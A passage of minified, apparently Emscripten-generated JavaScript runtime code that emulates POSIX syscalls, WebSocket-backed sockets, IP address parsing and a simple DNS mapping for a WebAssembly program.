supported");for(var total=0,srcReadLow=readfds?GROWABLE_HEAP_I32()[readfds>>2]:0,srcReadHigh=readfds?GROWABLE_HEAP_I32()[readfds+4>>2]:0,srcWriteLow=writefds?GROWABLE_HEAP_I32()[writefds>>2]:0,srcWriteHigh=writefds?GROWABLE_HEAP_I32()[writefds+4>>2]:0,srcExceptLow=exceptfds?GROWABLE_HEAP_I32()[exceptfds>>2]:0,srcExceptHigh=exceptfds?GROWABLE_HEAP_I32()[exceptfds+4>>2]:0,dstReadLow=0,dstReadHigh=0,dstWriteLow=0,dstWriteHigh=0,dstExceptLow=0,dstExceptHigh=0,allLow=(readfds?GROWABLE_HEAP_I32()[readfds>>2]:0)|(writefds?GROWABLE_HEAP_I32()[writefds>>2]:0)|(exceptfds?GROWABLE_HEAP_I32()[exceptfds>>2]:0),allHigh=(readfds?GROWABLE_HEAP_I32()[readfds+4>>2]:0)|(writefds?GROWABLE_HEAP_I32()[writefds+4>>2]:0)|(exceptfds?GROWABLE_HEAP_I32()[exceptfds+4>>2]:0),check=function(fd,low,high,val){return fd<32?low&val:high&val},fd=0;fd<nfds;fd++){var mask=1<<fd%32;if(check(fd,allLow,allHigh,mask)){var stream=FS.getStream(fd);if(!stream)throw new FS.ErrnoError(8);var flags=SYSCALLS.DEFAULT_POLLMASK;stream.stream_ops.poll&&(flags=stream.stream_ops.poll(stream)),1&flags&&check(fd,srcReadLow,srcReadHigh,mask)&&(fd<32?dstReadLow|=mask:dstReadHigh|=mask,total++),4&flags&&check(fd,srcWriteLow,srcWriteHigh,mask)&&(fd<32?dstWriteLow|=mask:dstWriteHigh|=mask,total++),2&flags&&check(fd,srcExceptLow,srcExceptHigh,mask)&&(fd<32?dstExceptLow|=mask:dstExceptHigh|=mask,total++)}}return readfds&&(GROWABLE_HEAP_I32()[readfds>>2]=dstReadLow,GROWABLE_HEAP_I32()[readfds+4>>2]=dstReadHigh),writefds&&(GROWABLE_HEAP_I32()[writefds>>2]=dstWriteLow,GROWABLE_HEAP_I32()[writefds+4>>2]=dstWriteHigh),exceptfds&&(GROWABLE_HEAP_I32()[exceptfds>>2]=dstExceptLow,GROWABLE_HEAP_I32()[exceptfds+4>>2]=dstExceptHigh),total}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}Module.invokeEntryPoint=invokeEntryPoint;var SOCKFS={mount:function(mount){return Module.websocket=Module.websocket&&"object"==typeof Module.websocket?Module.websocket:{},Module.websocket._callbacks={},Module.websocket.on=function(event,callback){return"function"==typeof callback&&(this._callbacks[event]=callback),this},Module.websocket.emit=function(event,param){"function"==typeof this._callbacks[event]&&this._callbacks[event].call(this,param)},FS.createNode(null,"/",16895,0)},createSocket:function(family,type,protocol){if(1==(type&=-526337)&&protocol&&6!=protocol)throw new FS.ErrnoError(66);var sock={family:family,type:type,protocol:protocol,server:null,error:null,peers:{},pending:[],recv_queue:[],sock_ops:SOCKFS.websocket_sock_ops},name=SOCKFS.nextname(),node=FS.createNode(SOCKFS.root,name,49152,0);node.sock=sock;var stream=FS.createStream({path:name,node:node,flags:2,seekable:!1,stream_ops:SOCKFS.stream_ops});return sock.stream=stream,sock},getSocket:function(fd){var stream=FS.getStream(fd);return stream&&FS.isSocket(stream.node.mode)?stream.node.sock:null},stream_ops:{poll:function(stream){var sock=stream.node.sock;return sock.sock_ops.poll(sock)},ioctl:function(stream,request,varargs){var sock=stream.node.sock;return sock.sock_ops.ioctl(sock,request,varargs)},read:function(stream,buffer,offset,length,position){var sock=stream.node.sock,msg=sock.sock_ops.recvmsg(sock,length);return msg?(buffer.set(msg.buffer,offset),msg.buffer.length):0},write:function(stream,buffer,offset,length,position){var sock=stream.node.sock;return sock.sock_ops.sendmsg(sock,buffer,offset,length)},close:function(stream){var sock=stream.node.sock;sock.sock_ops.close(sock)}},nextname:function(){return SOCKFS.nextname.current||(SOCKFS.nextname.current=0),"socket["+SOCKFS.nextname.current+++"]"},websocket_sock_ops:{createPeer:function(sock,addr,port){var ws;if("object"==typeof addr&&(ws=addr,addr=null,port=null),ws)if(ws._socket)addr=ws._socket.remoteAddress,port=ws._socket.remotePort;else{var result=/ws[s]?:\/\/([^:]+):(\d+)/.exec(ws.url);if(!result)throw new Error("WebSocket URL must be in the format ws(s)://address:port");addr=result[1],port=parseInt(result[2],10)}else try{var runtimeConfig=Module.websocket&&"object"==typeof Module.websocket,url="ws:#".replace("#","//");if(runtimeConfig&&"string"==typeof Module.websocket.url&&(url=Module.websocket.url),"ws://"===url||"wss://"===url){var parts=addr.split("/");url=url+parts[0]+":"+port+"/"+parts.slice(1).join("/")}var subProtocols="binary";runtimeConfig&&"string"==typeof Module.websocket.subprotocol&&(subProtocols=Module.websocket.subprotocol);var opts=void 0;"null"!==subProtocols&&(opts=subProtocols=subProtocols.replace(/^ +| +$/g,"").split(/ *, */)),runtimeConfig&&null===Module.websocket.subprotocol&&(subProtocols="null",opts=void 0),(ws=new WebSocket(url,opts)).binaryType="arraybuffer"}catch(e){throw new FS.ErrnoError(23)}var peer={addr:addr,port:port,socket:ws,dgram_send_queue:[]};return SOCKFS.websocket_sock_ops.addPeer(sock,peer),SOCKFS.websocket_sock_ops.handlePeerEvents(sock,peer),2===sock.type&&void 0!==sock.sport&&peer.dgram_send_queue.push(new Uint8Array([255,255,255,255,"p".charCodeAt(0),"o".charCodeAt(0),"r".charCodeAt(0),"t".charCodeAt(0),(65280&sock.sport)>>8,255&sock.sport])),peer},getPeer:function(sock,addr,port){return sock.peers[addr+":"+port]},addPeer:function(sock,peer){sock.peers[peer.addr+":"+peer.port]=peer},removePeer:function(sock,peer){delete sock.peers[peer.addr+":"+peer.port]},handlePeerEvents:function(sock,peer){var first=!0,handleOpen=function(){Module.websocket.emit("open",sock.stream.fd);try{for(var queued=peer.dgram_send_queue.shift();queued;)peer.socket.send(queued),queued=peer.dgram_send_queue.shift()}catch(e){peer.socket.close()}};function handleMessage(data){if("string"==typeof data){data=(new TextEncoder).encode(data)}else{if(assert(void 0!==data.byteLength),0==data.byteLength)return;data=new Uint8Array(data)}var wasfirst=first;if(first=!1,wasfirst&&10===data.length&&255===data[0]&&255===data[1]&&255===data[2]&&255===data[3]&&data[4]==="p".charCodeAt(0)&&data[5]==="o".charCodeAt(0)&&data[6]==="r".charCodeAt(0)&&data[7]==="t".charCodeAt(0)){var newport=data[8]<<8|data[9];return SOCKFS.websocket_sock_ops.removePeer(sock,peer),peer.port=newport,void SOCKFS.websocket_sock_ops.addPeer(sock,peer)}sock.recv_queue.push({addr:peer.addr,port:peer.port,data:data}),Module.websocket.emit("message",sock.stream.fd)}ENVIRONMENT_IS_NODE?(peer.socket.on("open",handleOpen),peer.socket.on("message",(function(data,isBinary){isBinary&&handleMessage(new Uint8Array(data).buffer)})),peer.socket.on("close",(function(){Module.websocket.emit("close",sock.stream.fd)})),peer.socket.on("error",(function(error){sock.error=14,Module.websocket.emit("error",[sock.stream.fd,sock.error,"ECONNREFUSED: Connection refused"])}))):(peer.socket.onopen=handleOpen,peer.socket.onclose=function(){Module.websocket.emit("close",sock.stream.fd)},peer.socket.onmessage=function peer_socket_onmessage(event){handleMessage(event.data)},peer.socket.onerror=function(error){sock.error=14,Module.websocket.emit("error",[sock.stream.fd,sock.error,"ECONNREFUSED: Connection refused"])})},poll:function(sock){if(1===sock.type&&sock.server)return sock.pending.length?65:0;var mask=0,dest=1===sock.type?SOCKFS.websocket_sock_ops.getPeer(sock,sock.daddr,sock.dport):null;return(sock.recv_queue.length||!dest||dest&&dest.socket.readyState===dest.socket.CLOSING||dest&&dest.socket.readyState===dest.socket.CLOSED)&&(mask|=65),(!dest||dest&&dest.socket.readyState===dest.socket.OPEN)&&(mask|=4),(dest&&dest.socket.readyState===dest.socket.CLOSING||dest&&dest.socket.readyState===dest.socket.CLOSED)&&(mask|=16),mask},ioctl:function(sock,request,arg){if(21531===request){var bytes=0;return sock.recv_queue.length&&(bytes=sock.recv_queue[0].data.length),GROWABLE_HEAP_I32()[arg>>2]=bytes,0}return 28},close:function(sock){if(sock.server){try{sock.server.close()}catch(e){}sock.server=null}for(var peers=Object.keys(sock.peers),i=0;i<peers.length;i++){var peer=sock.peers[peers[i]];try{peer.socket.close()}catch(e){}SOCKFS.websocket_sock_ops.removePeer(sock,peer)}return 0},bind:function(sock,addr,port){if(void 0!==sock.saddr||void 0!==sock.sport)throw new FS.ErrnoError(28);if(sock.saddr=addr,sock.sport=port,2===sock.type){sock.server&&(sock.server.close(),sock.server=null);try{sock.sock_ops.listen(sock,0)}catch(e){if(!(e instanceof FS.ErrnoError))throw e;if(138!==e.errno)throw e}}},connect:function(sock,addr,port){if(sock.server)throw new FS.ErrnoError(138);if(void 0!==sock.daddr&&void 0!==sock.dport){var dest=SOCKFS.websocket_sock_ops.getPeer(sock,sock.daddr,sock.dport);if(dest)throw dest.socket.readyState===dest.socket.CONNECTING?new FS.ErrnoError(7):new FS.ErrnoError(30)}var peer=SOCKFS.websocket_sock_ops.createPeer(sock,addr,port);throw sock.daddr=peer.addr,sock.dport=peer.port,new FS.ErrnoError(26)},listen:function(sock,backlog){if(!ENVIRONMENT_IS_NODE)throw new FS.ErrnoError(138)},accept:function(listensock){if(!listensock.server||!listensock.pending.length)throw new FS.ErrnoError(28);var newsock=listensock.pending.shift();return newsock.stream.flags=listensock.stream.flags,newsock},getname:function(sock,peer){var addr,port;if(peer){if(void 0===sock.daddr||void 0===sock.dport)throw new FS.ErrnoError(53);addr=sock.daddr,port=sock.dport}else addr=sock.saddr||0,port=sock.sport||0;return{addr:addr,port:port}},sendmsg:function(sock,buffer,offset,length,addr,port){if(2===sock.type){if(void 0!==addr&&void 0!==port||(addr=sock.daddr,port=sock.dport),void 0===addr||void 0===port)throw new FS.ErrnoError(17)}else addr=sock.daddr,port=sock.dport;var data,dest=SOCKFS.websocket_sock_ops.getPeer(sock,addr,port);if(1===sock.type){if(!dest||dest.socket.readyState===dest.socket.CLOSING||dest.socket.readyState===dest.socket.CLOSED)throw new FS.ErrnoError(53);if(dest.socket.readyState===dest.socket.CONNECTING)throw new FS.ErrnoError(6)}if(ArrayBuffer.isView(buffer)&&(offset+=buffer.byteOffset,buffer=buffer.buffer),data=buffer instanceof SharedArrayBuffer?new Uint8Array(new Uint8Array(buffer.slice(offset,offset+length))).buffer:buffer.slice(offset,offset+length),2===sock.type&&(!dest||dest.socket.readyState!==dest.socket.OPEN))return dest&&dest.socket.readyState!==dest.socket.CLOSING&&dest.socket.readyState!==dest.socket.CLOSED||(dest=SOCKFS.websocket_sock_ops.createPeer(sock,addr,port)),dest.dgram_send_queue.push(data),length;try{return dest.socket.send(data),length}catch(e){throw new FS.ErrnoError(28)}},recvmsg:function(sock,length){if(1===sock.type&&sock.server)throw new FS.ErrnoError(53);var queued=sock.recv_queue.shift();if(!queued){if(1===sock.type){var dest=SOCKFS.websocket_sock_ops.getPeer(sock,sock.daddr,sock.dport);if(!dest)throw new FS.ErrnoError(53);if(dest.socket.readyState===dest.socket.CLOSING||dest.socket.readyState===dest.socket.CLOSED)return null;throw new FS.ErrnoError(6)}throw new FS.ErrnoError(6)}var queuedLength=queued.data.byteLength||queued.data.length,queuedOffset=queued.data.byteOffset||0,queuedBuffer=queued.data.buffer||queued.data,bytesRead=Math.min(length,queuedLength),res={buffer:new Uint8Array(queuedBuffer,queuedOffset,bytesRead),addr:queued.addr,port:queued.port};if(1===sock.type&&bytesRead<queuedLength){var bytesRemaining=queuedLength-bytesRead;queued.data=new Uint8Array(queuedBuffer,queuedOffset+bytesRead,bytesRemaining),sock.recv_queue.unshift(queued)}return res}}};function getSocketFromFD(fd){var socket=SOCKFS.getSocket(fd);if(!socket)throw new FS.ErrnoError(8);return socket}function setErrNo(value){return GROWABLE_HEAP_I32()[___errno_location()>>2]=value,value}var Sockets={BUFFER_SIZE:10240,MAX_BUFFER_SIZE:10485760,nextFd:1,fds:{},nextport:1,maxport:65535,peer:null,connections:{},portmap:{},localAddr:4261412874,addrPool:[33554442,50331658,67108874,83886090,100663306,117440522,134217738,150994954,167772170,184549386,201326602,218103818,234881034]};function inetPton4(str){for(var b=str.split("."),i=0;i<4;i++){var tmp=Number(b[i]);if(isNaN(tmp))return null;b[i]=tmp}return(b[0]|b[1]<<8|b[2]<<16|b[3]<<24)>>>0}function jstoi_q(str){return parseInt(str)}function inetPton6(str){var words,w,offset,z,parts=[];if(!/^((?=.*::)(?!.*::.+::)(::)?([\dA-F]{1,4}:(:|\b)|){5}|([\dA-F]{1,4}:){6})((([\dA-F]{1,4}((?!\3)::|:\b|$))|(?!\2\3)){2}|(((2[0-4]|1\d|[1-9])?\d|25[0-5])\.?\b){4})$/i.test(str))return null;if("::"===str)return[0,0,0,0,0,0,0,0];for((str=str.startsWith("::")?str.replace("::","Z:"):str.replace("::",":Z:")).indexOf(".")>0?((words=(str=str.replace(new RegExp("[.]","g"),":")).split(":"))[words.length-4]=jstoi_q(words[words.length-4])+256*jstoi_q(words[words.length-3]),words[words.length-3]=jstoi_q(words[words.length-2])+256*jstoi_q(words[words.length-1]),words=words.slice(0,words.length-2)):words=str.split(":"),offset=0,z=0,w=0;w<words.length;w++)if("string"==typeof words[w])if("Z"===words[w]){for(z=0;z<8-words.length+1;z++)parts[w+z]=0;offset=z-1}else parts[w+offset]=_htons(parseInt(words[w],16));else parts[w+offset]=words[w];return[parts[1]<<16|parts[0],parts[3]<<16|parts[2],parts[5]<<16|parts[4],parts[7]<<16|parts[6]]}function writeSockaddr(sa,family,addr,port,addrlen){switch(family){case 2:addr=inetPton4(addr),zeroMemory(sa,16),addrlen&&(GROWABLE_HEAP_I32()[addrlen>>2]=16),GROWABLE_HEAP_I16()[sa>>1]=family,GROWABLE_HEAP_I32()[sa+4>>2]=addr,GROWABLE_HEAP_I16()[sa+2>>1]=_htons(port);break;case 10:addr=inetPton6(addr),zeroMemory(sa,28),addrlen&&(GROWABLE_HEAP_I32()[addrlen>>2]=28),GROWABLE_HEAP_I32()[sa>>2]=family,GROWABLE_HEAP_I32()[sa+8>>2]=addr[0],GROWABLE_HEAP_I32()[sa+12>>2]=addr[1],GROWABLE_HEAP_I32()[sa+16>>2]=addr[2],GROWABLE_HEAP_I32()[sa+20>>2]=addr[3],GROWABLE_HEAP_I16()[sa+2>>1]=_htons(port);break;default:return 5}return 0}var DNS={address_map:{id:1,addrs:{},names:{}},lookup_name:function(name){var addr,res=inetPton4(name);if(null!==res)return name;if(null!==(res=inetPton6(name)))return name;if(DNS.address_map.addrs[name])addr=DNS.address_map.addrs[name];else{var id=DNS.address_map.id++;assert(id<65535,"exceeded max address mappings of 65535"),addr="172.29."+(255&id)+"."+(65280&id),DNS.address_map.names[addr]=name,DNS.address_map.addrs[name]=addr}return addr},lookup_addr:function(addr){return DNS.address_map.names[addr]?DNS.address_map.names[addr]:null}};function ___syscall_accept4(fd,addr,addrlen,flags){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(5,1,fd,addr,addrlen,flags);try{var sock=getSocketFromFD(fd),newsock=sock.sock_ops.accept(sock);if(addr)assert(!writeSockaddr(addr,newsock.family,DNS.lookup_name(newsock.daddr),newsock.dport,addrlen));return newsock.stream.fd}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function inetNtop4(addr){return(255&addr)+"."+(addr>>8&255)+"."+(addr>>16&255)+"."+(addr>>24&255)}function inetNtop6(ints){var str="",word=0,longest=0,lastzero=0,zstart=0,len=0,i=0,parts=[65535&ints[0],ints[0]>>16,65535&ints[1],ints[1]>>16,65535&ints[2],ints[2]>>16,65535&ints[3],ints[3]>>16],hasipv4=!0,v4part="";for(i=0;i<5;i++)if(0!==parts[i]){hasipv4=!1;break}if(hasipv4){if(v4part=inetNtop4(parts[6]|parts[7]<<16),-1===parts[5])return str="::ffff:",str+=v4part;if(0===parts[5])return str="::","0.0.0.0"===v4part&&(v4part=""),"0.0.0.1"===v4part&&(v4part="1"),str+=v4part}for(word=0;word<8;word++)0===parts[word]&&(word-lastzero>1&&(len=0),lastzero=word,len++),len>longest&&(zstart=word-(longest=len)+1);for(word=0;word<8;word++)longest>1&&0===parts[word]&&word>=zstart&&word<zstart+longest?word===zstart&&(str+=":",0===zstart&&(str+=":")):(str+=Number(_ntohs(65535&parts[word])).toString(16),str+=word<7?":":"");return str}function readSockaddr(sa,salen){var addr,family=GROWABLE_HEAP_I16()[sa>>1],port=_ntohs(GROWABLE_HEAP_U16()[sa+2>>1]);switch(family){case 2:if(16!==salen)return{errno:28};addr=inetNtop4(addr=GROWABLE_HEAP_I32()[sa+4>>2]);break;case 10:if(28!==salen)return{errno:28};addr=inetNtop6(addr=[GROWABLE_HEAP_I32()[sa+8>>2],GROWABLE_HEAP_I32()[sa+12>>2],GROWABLE_HEAP_I32()[sa+16>>2],GROWABLE_HEAP_I32()[sa+20>>2]]);break;default:return{errno:5}}return{family:family,addr:addr,port:port}}function getSocketAddress(addrp,addrlen,allowNull){if(allowNull&&0===addrp)return null;var info=readSockaddr(addrp,addrlen);if(info.errno)throw new FS.ErrnoError(info.errno);return info.addr=DNS.lookup_addr(info.addr)||info.addr,info}function ___syscall_bind(fd,addr,addrlen){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(6,1,fd,addr,addrlen);try{var sock=getSocketFromFD(fd),info=getSocketAddress(addr,addrlen);return sock.sock_ops.bind(sock,info.addr,info.port),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_chdir(path){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(7,1,path);try{return path=SYSCALLS.getStr(path),FS.chdir(path),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_chmod(path,mode){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(8,1,path,mode);try{return path=SYSCALLS.getStr(path),FS.chmod(path,mode),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_connect(fd,addr,addrlen){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(9,1,fd,addr,addrlen);try{var sock=getSocketFromFD(fd),info=getSocketAddress(addr,addrlen);return sock.sock_ops.connect(sock,info.addr,info.port),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_faccessat(dirfd,path,amode,flags){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(10,1,dirfd,path,amode,flags);try{if(path=SYSCALLS.getStr(path),assert(0===flags),path=SYSCALLS.calculateAt(dirfd,path),-8&amode)return-28;var node=FS.lookupPath(path,{follow:!0}).node;if(!node)return-44;var perms="";return 4&amode&&(perms+="r"),2&amode&&(perms+="w"),1&amode&&(perms+="x"),perms&&FS.nodePermissions(node,perms)?-2:0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_fchmod(fd,mode){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(11,1,fd,mode);try{return FS.fchmod(fd,mode),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_fcntl64(fd,cmd,varargs){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(12,1,fd,cmd,varargs);SYSCALLS.varargs=varargs;try{var stream=SYSCALLS.getStreamFromFD(fd);switch(cmd){case 0:return(arg=SYSCALLS.get())<0?-28:FS.createStream(stream,arg).fd;case 1:case 2:case 6:case 7:return 0;case 3:return stream.flags;case 4:var arg=SYSCALLS.get();return stream.flags|=arg,0;case 5:arg=SYSCALLS.get();return GROWABLE_HEAP_I16()[arg+0>>1]=2,0;case 16:case 8:default:return-28;case 9:return setErrNo(28),-1}}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_getcwd(buf,size){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(13,1,buf,size);try{if(0===size)return-28;var cwd=FS.cwd(),cwdLengthInBytes=lengthBytesUTF8(cwd)+1;return size<cwdLengthInBytes?-68:(stringToUTF8(cwd,buf,size),cwdLengthInBytes)}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_getdents64(fd,dirp,count){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(14,1,fd,dirp,count);try{var stream=SYSCALLS.getStreamFromFD(fd);stream.getdents||(stream.getdents=FS.readdir(stream.path));for(var pos=0,off=FS.llseek(stream,0,1),idx=Math.floor(off/280);idx<stream.getdents.length&&pos+280<=count;){var id,type,name=stream.getdents[idx];if("."===name)id=stream.node.id,type=4;else if(".."===name){id=FS.lookupPath(stream.path,{parent:!0}).node.id,type=4}else{var child=FS.lookupNode(stream.node,name);id=child.id,type=FS.isChrdev(child.mode)?2:FS.isDir(child.mode)?4:FS.isLink(child.mode)?10:8}assert(id),tempI64=[id>>>0,(tempDouble=id,+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[dirp+pos>>2]=tempI64[0],GROWABLE_HEAP_I32()[dirp+pos+4>>2]=tempI64[1],tempI64=[280*(idx+1)>>>0,(tempDouble=280*(idx+1),+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[dirp+pos+8>>2]=tempI64[0],GROWABLE_HEAP_I32()[dirp+pos+12>>2]=tempI64[1],GROWABLE_HEAP_I16()[dirp+pos+16>>1]=280,GROWABLE_HEAP_I8()[dirp+pos+18>>0]=type,stringToUTF8(name,dirp+pos+19,256),pos+=280,idx+=1}return FS.llseek(stream,280*idx,0),pos}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_getsockname(fd,addr,addrlen){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(15,1,fd,addr,addrlen);try{err("__syscall_getsockname "+fd);var sock=getSocketFromFD(fd);return assert(!writeSockaddr(addr,sock.family,DNS.lookup_name(sock.saddr||"0.0.0.0"),sock.sport,addrlen)),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_getsockopt(fd,level,optname,optval,optlen){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(16,1,fd,level,optname,optval,optlen);try{var sock=getSocketFromFD(fd);return 1===level&&4===optname?(GROWABLE_HEAP_I32()[optval>>2]=sock.error,GROWABLE_HEAP_I32()[optlen>>2]=4,sock.error=null,0):-50}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_ioctl(fd,op,varargs){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(17,1,fd,op,varargs);SYSCALLS.varargs=varargs;try{var stream=SYSCALLS.getStreamFromFD(fd);switch(op){case 21509:case 21505:case 21510:case 21511:case 21512:case 21506:case 21507:case 21508:case 21523:case 21524:return stream.tty?0:-59;case 21519:if(!stream.tty)return-59;var argp=SYSCALLS.get();return GROWABLE_HEAP_I32()[argp>>2]=0,0;case 21520:return stream.tty?-28:-59;case 21531:argp=SYSCALLS.get();return FS.ioctl(stream,op,argp);default:return-28}}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_listen(fd,backlog){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(18,1,fd,backlog);try{var sock=getSocketFromFD(fd);return sock.sock_ops.listen(sock,backlog),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_lstat64(path,buf){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(19,1,path,buf);try{return path=SYSCALLS.getStr(path),SYSCALLS.doStat(FS.lstat,path,buf)}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_mkdirat(dirfd,path,mode){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(20,1,dirfd,path,mode);try{return path=SYSCALLS.getStr(path),path=SYSCALLS.calculateAt(dirfd,path),"/"===(path=PATH.normalize(path))[path.length-1]&&(path=path.substr(0,path.length-1)),FS.mkdir(path,mode,0),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_newfstatat(dirfd,path,buf,flags){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(21,1,dirfd,path,buf,flags);try{path=SYSCALLS.getStr(path);var nofollow=256&flags,allowEmpty=4096&flags;return assert(!(flags&=-4353),flags),path=SYSCALLS.calculateAt(dirfd,path,allowEmpty),SYSCALLS.doStat(nofollow?FS.lstat:FS.stat,path,buf)}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_openat(dirfd,path,flags,varargs){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(22,1,dirfd,path,flags,varargs);SYSCALLS.varargs=varargs;try{path=SYSCALLS.getStr(path),path=SYSCALLS.calculateAt(dirfd,path);var mode=varargs?SYSCALLS.get():0;return FS.open(path,flags,mode).fd}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_poll(fds,nfds,timeout){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(23,1,fds,nfds,timeout);try{for(var nonzero=0,i=0;i<nfds;i++){var pollfd=fds+8*i,fd=GROWABLE_HEAP_I32()[pollfd>>2],events=GROWABLE_HEAP_I16()[pollfd+4>>1],mask=32,stream=FS.getStream(fd);stream&&(mask=SYSCALLS.DEFAULT_POLLMASK,stream.stream_ops.poll&&(mask=stream.stream_ops.poll(stream))),(mask&=24|events)&&nonzero++,GROWABLE_HEAP_I16()[pollfd+6>>1]=mask}return nonzero}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_readlinkat(dirfd,path,buf,bufsize){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(24,1,dirfd,path,buf,bufsize);try{if(path=SYSCALLS.getStr(path),path=SYSCALLS.calculateAt(dirfd,path),bufsize<=0)return-28;var ret=FS.readlink(path),len=Math.min(bufsize,lengthBytesUTF8(ret)),endChar=GROWABLE_HEAP_I8()[buf+len];return stringToUTF8(ret,buf,bufsize+1),GROWABLE_HEAP_I8()[buf+len]=endChar,len}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_recvfrom(fd,buf,len,flags,addr,addrlen){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(25,1,fd,buf,len,flags,addr,addrlen);try{var sock=getSocketFromFD(fd),msg=sock.sock_ops.recvmsg(sock,len);if(!msg)return 0;if(addr)assert(!writeSockaddr(addr,sock.family,DNS.lookup_name(msg.addr),msg.port,addrlen));return GROWABLE_HEAP_U8().set(msg.buffer,buf),msg.buffer.byteLength}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_renameat(olddirfd,oldpath,newdirfd,newpath){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(26,1,olddirfd,oldpath,newdirfd,newpath);try{return oldpath=SYSCALLS.getStr(oldpath),newpath=SYSCALLS.getStr(newpath),oldpath=SYSCALLS.calculateAt(olddirfd,oldpath),newpath=SYSCALLS.calculateAt(newdirfd,newpath),FS.rename(oldpath,newpath),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_rmdir(path){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(27,1,path);try{return path=SYSCALLS.getStr(path),FS.rmdir(path),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_sendto(fd,message,length,flags,addr,addr_len){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(28,1,fd,message,length,flags,addr,addr_len);try{var sock=getSocketFromFD(fd),dest=getSocketAddress(addr,addr_len,!0);return dest?sock.sock_ops.sendmsg(sock,GROWABLE_HEAP_I8(),message,length,dest.addr,dest.port):FS.write(sock.stream,GROWABLE_HEAP_I8(),message,length)}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_socket(domain,type,protocol){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(29,1,domain,type,protocol);try{var sock=SOCKFS.createSocket(domain,type,protocol);return assert(sock.stream.fd<64),sock.stream.fd}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_stat64(path,buf){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(30,1,path,buf);try{return path=SYSCALLS.getStr(path),SYSCALLS.doStat(FS.stat,path,buf)}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return-e.errno}}function ___syscall_statfs64(path,size,buf){if(ENVIRONMENT_IS_PTHREAD)return 